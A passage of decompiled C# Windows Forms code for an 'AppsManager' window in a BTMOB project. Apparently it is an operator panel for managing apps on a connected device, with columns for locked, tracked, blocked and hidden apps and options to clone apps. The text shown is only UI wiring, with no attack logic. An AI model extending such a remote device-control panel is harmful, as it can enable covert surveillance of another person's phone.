using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using BTMOB.My.Resources;
using DrakeUI.Framework;
using Microsoft.VisualBasic.CompilerServices;

namespace BTMOB;

[DesignerGenerated]
public class AppsManager : basestyle
{
	private IContainer components;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DGV0")]
	private DataGridView _DGV0;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("statetimer")]
	private Timer _statetimer;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("emptysearch")]
	private DrakeUIButtonIcon _emptysearch;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("searchtext")]
	private DrakeUITextBox _searchtext;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("ToolStripMenuItem1")]
	private ToolStripMenuItem _ToolStripMenuItem1;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("ClearAllToolStripMenuItem")]
	private ToolStripMenuItem _ClearAllToolStripMenuItem;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("ToolStripMenuItem2")]
	private ToolStripMenuItem _ToolStripMenuItem2;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("ToolStripMenuItem3")]
	private ToolStripMenuItem _ToolStripMenuItem3;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("ToolStripMenuItem4")]
	private ToolStripMenuItem _ToolStripMenuItem4;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("ToolStripMenuItem5")]
	private ToolStripMenuItem _ToolStripMenuItem5;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("ToolStripMenuItem6")]
	private ToolStripMenuItem _ToolStripMenuItem6;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("ToolStripMenuItem7")]
	private ToolStripMenuItem _ToolStripMenuItem7;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("refbtm")]
	private DrakeUIButtonIcon _refbtm;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("ToolStripMenuItem8")]
	private ToolStripMenuItem _ToolStripMenuItem8;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("ToolStripMenuItem9")]
	private ToolStripMenuItem _ToolStripMenuItem9;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DrakeUIButtonIcon1")]
	private DrakeUIButtonIcon _DrakeUIButtonIcon1;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DGV_CLONE")]
	private DataGridView _DGV_CLONE;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("CloneAppToolStripMenuItem")]
	private ToolStripMenuItem _CloneAppToolStripMenuItem;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("enablebtn")]
	private DrakeUIButtonIcon _enablebtn;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("disablebtn")]
	private DrakeUIButtonIcon _disablebtn;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("OpenCloneToolStripMenuItem")]
	private ToolStripMenuItem _OpenCloneToolStripMenuItem;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("RemoveCloneToolStripMenuItem")]
	private ToolStripMenuItem _RemoveCloneToolStripMenuItem;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("ToolStripMenuItem11")]
	private ToolStripMenuItem _ToolStripMenuItem11;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("ToolStripMenuItem10")]
	private ToolStripMenuItem _ToolStripMenuItem10;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("ToolStripMenuItem12")]
	private ToolStripMenuItem _ToolStripMenuItem12;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("ToolStripMenuItem14")]
	private ToolStripMenuItem _ToolStripMenuItem14;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("ToolStripMenuItem13")]
	private ToolStripMenuItem _ToolStripMenuItem13;

	public BTClient Btcli;

	public virtual DataGridView DGV0
	{
		[CompilerGenerated]
		get
		{
			return _DGV0;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			DataGridViewCellPaintingEventHandler value2 = DataGridView1_CellPainting;
			DataGridView dataGridView = _DGV0;
			if (dataGridView != null)
			{
				dataGridView.CellPainting -= value2;
			}
			_DGV0 = value;
			dataGridView = _DGV0;
			if (dataGridView != null)
			{
				dataGridView.CellPainting += value2;
			}
		}
	}

	internal virtual Timer statetimer
	{
		[CompilerGenerated]
		get
		{
			return _statetimer;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = statetimer_Tick;
			Timer timer = _statetimer;
			if (timer != null)
			{
				timer.Tick -= value2;
			}
			_statetimer = value;
			timer = _statetimer;
			if (timer != null)
			{
				timer.Tick += value2;
			}
		}
	}

	[field: AccessedThroughProperty("Panel35")]
	internal virtual Panel Panel35
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUIButtonIcon emptysearch
	{
		[CompilerGenerated]
		get
		{
			return _emptysearch;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = emptysearch_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _emptysearch;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_emptysearch = value;
			drakeUIButtonIcon = _emptysearch;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	internal virtual DrakeUITextBox searchtext
	{
		[CompilerGenerated]
		get
		{
			return _searchtext;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = searchtext_TextChanged;
			DrakeUITextBox drakeUITextBox = _searchtext;
			if (drakeUITextBox != null)
			{
				drakeUITextBox.TextChanged -= value2;
			}
			_searchtext = value;
			drakeUITextBox = _searchtext;
			if (drakeUITextBox != null)
			{
				drakeUITextBox.TextChanged += value2;
			}
		}
	}

	[field: AccessedThroughProperty("Panel3")]
	internal virtual Panel Panel3
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("ctxapps")]
	internal virtual ContextMenuStrip ctxapps
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual ToolStripMenuItem ToolStripMenuItem1
	{
		[CompilerGenerated]
		get
		{
			return _ToolStripMenuItem1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = ToolStripMenuItem1_Click;
			ToolStripMenuItem toolStripMenuItem = _ToolStripMenuItem1;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_ToolStripMenuItem1 = value;
			toolStripMenuItem = _ToolStripMenuItem1;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem ClearAllToolStripMenuItem
	{
		[CompilerGenerated]
		get
		{
			return _ClearAllToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = ClearAllToolStripMenuItem_Click;
			ToolStripMenuItem toolStripMenuItem = _ClearAllToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_ClearAllToolStripMenuItem = value;
			toolStripMenuItem = _ClearAllToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem ToolStripMenuItem2
	{
		[CompilerGenerated]
		get
		{
			return _ToolStripMenuItem2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = ToolStripMenuItem2_Click;
			ToolStripMenuItem toolStripMenuItem = _ToolStripMenuItem2;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_ToolStripMenuItem2 = value;
			toolStripMenuItem = _ToolStripMenuItem2;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem ToolStripMenuItem3
	{
		[CompilerGenerated]
		get
		{
			return _ToolStripMenuItem3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = ToolStripMenuItem3_Click;
			ToolStripMenuItem toolStripMenuItem = _ToolStripMenuItem3;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_ToolStripMenuItem3 = value;
			toolStripMenuItem = _ToolStripMenuItem3;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem ToolStripMenuItem4
	{
		[CompilerGenerated]
		get
		{
			return _ToolStripMenuItem4;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = ToolStripMenuItem4_Click;
			ToolStripMenuItem toolStripMenuItem = _ToolStripMenuItem4;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_ToolStripMenuItem4 = value;
			toolStripMenuItem = _ToolStripMenuItem4;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem ToolStripMenuItem5
	{
		[CompilerGenerated]
		get
		{
			return _ToolStripMenuItem5;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = ToolStripMenuItem5_Click;
			ToolStripMenuItem toolStripMenuItem = _ToolStripMenuItem5;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_ToolStripMenuItem5 = value;
			toolStripMenuItem = _ToolStripMenuItem5;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("ToolStripSeparator1")]
	internal virtual ToolStripSeparator ToolStripSeparator1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("ToolStripSeparator2")]
	internal virtual ToolStripSeparator ToolStripSeparator2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual ToolStripMenuItem ToolStripMenuItem6
	{
		[CompilerGenerated]
		get
		{
			return _ToolStripMenuItem6;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = ToolStripMenuItem6_Click;
			ToolStripMenuItem toolStripMenuItem = _ToolStripMenuItem6;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_ToolStripMenuItem6 = value;
			toolStripMenuItem = _ToolStripMenuItem6;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem ToolStripMenuItem7
	{
		[CompilerGenerated]
		get
		{
			return _ToolStripMenuItem7;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = ToolStripMenuItem7_Click;
			ToolStripMenuItem toolStripMenuItem = _ToolStripMenuItem7;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_ToolStripMenuItem7 = value;
			toolStripMenuItem = _ToolStripMenuItem7;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("ToolStripSeparator3")]
	internal virtual ToolStripSeparator ToolStripSeparator3
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("ToolStripSeparator4")]
	internal virtual ToolStripSeparator ToolStripSeparator4
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUIButtonIcon refbtm
	{
		[CompilerGenerated]
		get
		{
			return _refbtm;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = refpasses_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _refbtm;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_refbtm = value;
			drakeUIButtonIcon = _refbtm;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("ToolStripSeparator5")]
	internal virtual ToolStripSeparator ToolStripSeparator5
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual ToolStripMenuItem ToolStripMenuItem8
	{
		[CompilerGenerated]
		get
		{
			return _ToolStripMenuItem8;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = ToolStripMenuItem8_Click;
			ToolStripMenuItem toolStripMenuItem = _ToolStripMenuItem8;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_ToolStripMenuItem8 = value;
			toolStripMenuItem = _ToolStripMenuItem8;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem ToolStripMenuItem9
	{
		[CompilerGenerated]
		get
		{
			return _ToolStripMenuItem9;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = ToolStripMenuItem9_Click;
			ToolStripMenuItem toolStripMenuItem = _ToolStripMenuItem9;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_ToolStripMenuItem9 = value;
			toolStripMenuItem = _ToolStripMenuItem9;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("DrakeUITabControl1")]
	internal virtual DrakeUITabControl DrakeUITabControl1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("TabPage1")]
	internal virtual TabPage TabPage1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("TabPage2")]
	internal virtual TabPage TabPage2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Panel2")]
	internal virtual Panel Panel2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUIButtonIcon DrakeUIButtonIcon1
	{
		[CompilerGenerated]
		get
		{
			return _DrakeUIButtonIcon1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = DrakeUIButtonIcon1_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _DrakeUIButtonIcon1;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_DrakeUIButtonIcon1 = value;
			drakeUIButtonIcon = _DrakeUIButtonIcon1;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	public virtual DataGridView DGV_CLONE
	{
		[CompilerGenerated]
		get
		{
			return _DGV_CLONE;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			DataGridViewCellPaintingEventHandler value2 = DataGridView1_CellPainting;
			DataGridView dataGridView = _DGV_CLONE;
			if (dataGridView != null)
			{
				dataGridView.CellPainting -= value2;
			}
			_DGV_CLONE = value;
			dataGridView = _DGV_CLONE;
			if (dataGridView != null)
			{
				dataGridView.CellPainting += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem CloneAppToolStripMenuItem
	{
		[CompilerGenerated]
		get
		{
			return _CloneAppToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = CloneAppToolStripMenuItem_Click;
			ToolStripMenuItem toolStripMenuItem = _CloneAppToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_CloneAppToolStripMenuItem = value;
			toolStripMenuItem = _CloneAppToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("ToolStripSeparator6")]
	internal virtual ToolStripSeparator ToolStripSeparator6
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUIButtonIcon enablebtn
	{
		[CompilerGenerated]
		get
		{
			return _enablebtn;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = enablebtn_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _enablebtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_enablebtn = value;
			drakeUIButtonIcon = _enablebtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	internal virtual DrakeUIButtonIcon disablebtn
	{
		[CompilerGenerated]
		get
		{
			return _disablebtn;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = disablebtn_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _disablebtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_disablebtn = value;
			drakeUIButtonIcon = _disablebtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("DrakeWidth_W11")]
	internal virtual DrakeWidth_W DrakeWidth_W11
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("ctxclones")]
	internal virtual ContextMenuStrip ctxclones
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual ToolStripMenuItem OpenCloneToolStripMenuItem
	{
		[CompilerGenerated]
		get
		{
			return _OpenCloneToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = OpenCloneToolStripMenuItem_Click;
			ToolStripMenuItem toolStripMenuItem = _OpenCloneToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_OpenCloneToolStripMenuItem = value;
			toolStripMenuItem = _OpenCloneToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem RemoveCloneToolStripMenuItem
	{
		[CompilerGenerated]
		get
		{
			return _RemoveCloneToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = RemoveCloneToolStripMenuItem_Click;
			ToolStripMenuItem toolStripMenuItem = _RemoveCloneToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_RemoveCloneToolStripMenuItem = value;
			toolStripMenuItem = _RemoveCloneToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("DataGridViewImageColumn1")]
	internal virtual DataGridViewImageColumn DataGridViewImageColumn1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("DataGridViewTextBoxColumn1")]
	internal virtual DataGridViewTextBoxColumn DataGridViewTextBoxColumn1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("DataGridViewTextBoxColumn3")]
	internal virtual DataGridViewTextBoxColumn DataGridViewTextBoxColumn3
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("appType")]
	internal virtual DataGridViewTextBoxColumn appType
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("ishidnclum")]
	internal virtual DataGridViewImageColumn ishidnclum
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual ToolStripMenuItem ToolStripMenuItem11
	{
		[CompilerGenerated]
		get
		{
			return _ToolStripMenuItem11;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = ToolStripMenuItem11_Click;
			ToolStripMenuItem toolStripMenuItem = _ToolStripMenuItem11;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_ToolStripMenuItem11 = value;
			toolStripMenuItem = _ToolStripMenuItem11;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem ToolStripMenuItem10
	{
		[CompilerGenerated]
		get
		{
			return _ToolStripMenuItem10;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = ToolStripMenuItem10_Click;
			ToolStripMenuItem toolStripMenuItem = _ToolStripMenuItem10;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_ToolStripMenuItem10 = value;
			toolStripMenuItem = _ToolStripMenuItem10;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("ToolStripSeparator7")]
	internal virtual ToolStripSeparator ToolStripSeparator7
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual ToolStripMenuItem ToolStripMenuItem12
	{
		[CompilerGenerated]
		get
		{
			return _ToolStripMenuItem12;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = ToolStripMenuItem12_Click;
			ToolStripMenuItem toolStripMenuItem = _ToolStripMenuItem12;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_ToolStripMenuItem12 = value;
			toolStripMenuItem = _ToolStripMenuItem12;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("apicoclm")]
	internal virtual DataGridViewImageColumn apicoclm
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("numnamclm")]
	internal virtual DataGridViewTextBoxColumn numnamclm
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("numculm")]
	internal virtual DataGridViewTextBoxColumn numculm
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("acctclum")]
	internal virtual DataGridViewTextBoxColumn acctclum
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("instlclum")]
	internal virtual DataGridViewTextBoxColumn instlclum
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("isenbld")]
	internal virtual DataGridViewImageColumn isenbld
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("islockd")]
	internal virtual DataGridViewImageColumn islockd
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("istrked")]
	internal virtual DataGridViewImageColumn istrked
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("jcticoclm")]
	internal virtual DataGridViewImageColumn jcticoclm
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("blkdclum")]
	internal virtual DataGridViewImageColumn blkdclum
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("favclumn")]
	internal virtual DataGridViewImageColumn favclumn
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual ToolStripMenuItem ToolStripMenuItem14
	{
		[CompilerGenerated]
		get
		{
			return _ToolStripMenuItem14;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = ToolStripMenuItem14_Click;
			ToolStripMenuItem toolStripMenuItem = _ToolStripMenuItem14;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_ToolStripMenuItem14 = value;
			toolStripMenuItem = _ToolStripMenuItem14;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem ToolStripMenuItem13
	{
		[CompilerGenerated]
		get
		{
			return _ToolStripMenuItem13;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = ToolStripMenuItem13_Click;
			ToolStripMenuItem toolStripMenuItem = _ToolStripMenuItem13;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_ToolStripMenuItem13 = value;
			toolStripMenuItem = _ToolStripMenuItem13;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("ToolStripSeparator8")]
	internal virtual ToolStripSeparator ToolStripSeparator8
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			base.Dispose(disposing);
		}
	}

	[System.Diagnostics.DebuggerStepThrough]
	private void InitializeComponent()
	{
		this.components = new System.ComponentModel.Container();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle = new System.Windows.Forms.DataGridViewCellStyle();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle2 = new System.Windows.Forms.DataGridViewCellStyle();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle3 = new System.Windows.Forms.DataGridViewCellStyle();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle4 = new System.Windows.Forms.DataGridViewCellStyle();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle5 = new System.Windows.Forms.DataGridViewCellStyle();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle6 = new System.Windows.Forms.DataGridViewCellStyle();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle7 = new System.Windows.Forms.DataGridViewCellStyle();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle8 = new System.Windows.Forms.DataGridViewCellStyle();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle9 = new System.Windows.Forms.DataGridViewCellStyle();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle10 = new System.Windows.Forms.DataGridViewCellStyle();
		System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(BTMOB.AppsManager));
		this.DGV0 = new System.Windows.Forms.DataGridView();
		this.apicoclm = new System.Windows.Forms.DataGridViewImageColumn();
		this.numnamclm = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.numculm = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.acctclum = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.instlclum = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.isenbld = new System.Windows.Forms.DataGridViewImageColumn();
		this.islockd = new System.Windows.Forms.DataGridViewImageColumn();
		this.istrked = new System.Windows.Forms.DataGridViewImageColumn();
		this.jcticoclm = new System.Windows.Forms.DataGridViewImageColumn();
		this.blkdclum = new System.Windows.Forms.DataGridViewImageColumn();
		this.favclumn = new System.Windows.Forms.DataGridViewImageColumn();
		this.ctxapps = new System.Windows.Forms.ContextMenuStrip(this.components);
		this.ToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
		this.ToolStripSeparator4 = new System.Windows.Forms.ToolStripSeparator();
		this.ToolStripMenuItem2 = new System.Windows.Forms.ToolStripMenuItem();
		this.ToolStripMenuItem5 = new System.Windows.Forms.ToolStripMenuItem();
		this.ToolStripSeparator1 = new System.Windows.Forms.ToolStripSeparator();
